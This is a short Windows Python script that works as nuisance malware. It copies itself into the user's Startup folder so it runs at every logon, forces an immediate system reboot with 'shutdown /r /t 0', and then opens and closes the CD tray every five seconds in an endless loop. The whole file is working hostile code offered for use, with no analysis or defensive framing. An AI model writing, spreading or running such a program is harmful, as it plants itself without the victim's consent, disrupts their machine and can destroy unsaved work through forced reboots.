import ctypes
import time
import os, sys

Thisfile = sys.argv[0]
Thisfile_name = os.path.basename(Thisfile)
user_path = os.path.expanduser('~')

if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
        os.system("shutdown /r /t 0")

while True:
    ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
    ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    time.sleep(5)